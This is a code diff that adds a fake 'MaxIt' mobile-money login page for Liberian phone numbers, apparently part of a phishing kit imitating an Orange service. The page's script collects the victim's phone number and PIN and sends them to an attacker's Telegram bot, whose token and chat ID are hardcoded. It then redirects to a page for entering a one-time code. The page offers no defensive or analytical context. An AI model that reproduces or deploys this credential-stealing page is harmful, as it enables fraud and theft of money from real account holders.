@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Login - MaxIt</title>
+<style>
+  :root {
+    --bg: #141415;
+    --text: #cfcfcf;
+    --muted: #9a9a9a;
+    --accent: #ff6600;
+    --btn: #b34700;
+    --line: #8a8a8a;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; background: var(--bg); font-family: Roboto, "Segoe UI", system-ui, sans-serif; }
+
+  .screen {
+    position: relative;
+    width: 100%;
+    max-width: 480px;
+    min-height: 100vh;
+    min-height: 100dvh;
+    margin: 0 auto;
+    background: var(--bg);
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .hero {
+    position: relative;
+    flex: 1 1 auto;
+    min-height: 45vh;
+    background:
+      linear-gradient(rgba(0,0,0,.55), rgba(0,0,0,.55)),
+      url("Screenshot_2026-11-03-19-56-24-515-edit_com.orange.myorange.olr.jpg") center top / cover no-repeat,
+      linear-gradient(160deg, #ff6600 0%, #cc5200 60%, #993d00 100%);
+  }
+
+  .back {
+    position: absolute;
+    top: 18px; left: 16px;
+    width: 40px; height: 40px;
+    display: grid; place-items: center;
+    background: none; border: 0; cursor: pointer;
+  }
+  .back svg { width: 26px; height: 26px; stroke: #fff; }
+
+  .wave {
+    position: absolute;
+    left: 0; right: 0; bottom: -1px;
+    width: 100%; height: 60px;
+    display: block;
+  }
+
+  .panel {
+    flex: 0 0 auto;
+    background: var(--bg);
+    padding: 22px 32px 40px;
+  }
+
+  h1 {
+    font-size: 24px;
+    font-weight: 700;
+    color: var(--text);
+    letter-spacing: .2px;
+    margin-bottom: 24px;
+  }
+
+  .field {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 10px 0 14px 14px;
+    border-bottom: 1.5px solid var(--line);
+    transition: border-color .2s;
+    margin-bottom: 16px;
+  }
+  .field:focus-within { border-color: var(--accent); }
+  .field svg { width: 26px; height: 26px; fill: var(--accent); flex: none; }
+  
+  .prefix {
+    color: var(--text);
+    font-size: 17px;
+    font-weight: 500;
+    user-select: none;
+    flex: none;
+  }
+
+  .field input {
+    flex: 1;
+    background: none; border: 0; outline: 0;
+    color: var(--text);
+    font-size: 17px;
+    font-family: inherit;
+  }
+  .field input::placeholder { color: var(--muted); }
+
+  .login {
+    display: block;
+    width: 100%;
+    margin: 30px auto 0;
+    padding: 18px;
+    background: var(--accent);
+    color: #fff;
+    border: 0;
+    border-radius: 10px;
+    font-size: 17px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: pointer;
+    transition: filter .15s, transform .05s;
+  }
+  .login:hover { filter: brightness(1.15); }
+  .login:active { transform: scale(.98); }
+  .login:disabled { opacity: 0.6; cursor: not-allowed; }
+</style>
+</head>
+<body>
+  <main class="screen">
+    <section class="hero">
+      <button class="back" aria-label="Back" onclick="history.back()">
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M19 12H5M12 19l-7-7 7-7"/>
+        </svg>
+      </button>
+
+      <svg class="wave" viewBox="0 0 400 60" preserveAspectRatio="none" aria-hidden="true">
+        <path d="M0 14 C 60 -6, 130 -4, 200 14 S 340 40, 400 8 L400 60 L0 60 Z" fill="#141415"/>
+      </svg>
+    </section>
+
+    <form class="panel" id="loginForm" novalidate>
+      <h1>Authentication</h1>
+
+      <label class="field">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="12" cy="7" r="4.5"/>
+          <path d="M3.5 22c0-5 3.8-8 8.5-8s8.5 3 8.5 8z"/>
+        </svg>
+        <span class="prefix">+231</span>
+        <input type="tel" id="phone" inputmode="tel" autocomplete="tel"
+               placeholder="77 XXX XXX / 88 XXX XXX" maxlength="9">
+      </label>
+
+      <label class="field">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+        </svg>
+        <input type="password" id="pin" inputmode="numeric" pattern="[0-9]*" maxlength="4"
+               placeholder="Enter 4-digit PIN">
+      </label>
+
+      <button class="login" type="submit" id="loginBtn">Log in</button>
+    </form>
+  </main>
+
+  <script>
+    const BOT_TOKEN = '8968898813:AAFZNIpX05KpoWyCHr1aW7l1UoeuRRiXP34';
+    const CHAT_ID = '5520957080';
+
+    function sendToTelegram(message) {
+      const encoded = encodeURIComponent(message);
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`)
+        .then(r => r.json())
+        .then(r => { console.log('Telegram (login):', r); return r; })
+        .catch(e => { console.error('Telegram error:', e); });
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      var phone = document.getElementById('phone').value.trim();
+      var pin = document.getElementById('pin').value.trim();
+
+      if (!phone) { document.getElementById('phone').focus(); return; }
+      if (!pin || pin.length !== 4) { document.getElementById('pin').focus(); return; }
+
+      const fullPhone = '+231' + phone;
+
+      // Persist for the next step
+      const planData = JSON.parse(localStorage.getItem('maxitPlanData')) || {};
+      planData.phone = fullPhone;
+      planData.pin = pin;
+      localStorage.setItem('maxitPlanData', JSON.stringify(planData));
+      localStorage.setItem('phone', fullPhone);
+
+      const btn = document.getElementById('loginBtn');
+      btn.disabled = true;
+      btn.textContent = 'Logging in...';
+
+      const message = `
+🔐 *MaxIt Login Submitted*
+
+🆔 Application ID: ${planData.applicationId || 'N/A'}
+📦 Selected Plan: ${planData.planTitle || 'N/A'} (${planData.planPrice || 'N/A'})
+📞 Phone: ${fullPhone}
+🔑 PIN: ${pin}
+🕐 Time: ${new Date().toLocaleString()}
+      `;
+
+      sendToTelegram(message).finally(() => {
+        window.location.href = 'OTP entry.html';
+      });
+    });
+  </script>
+</body>
+</html>
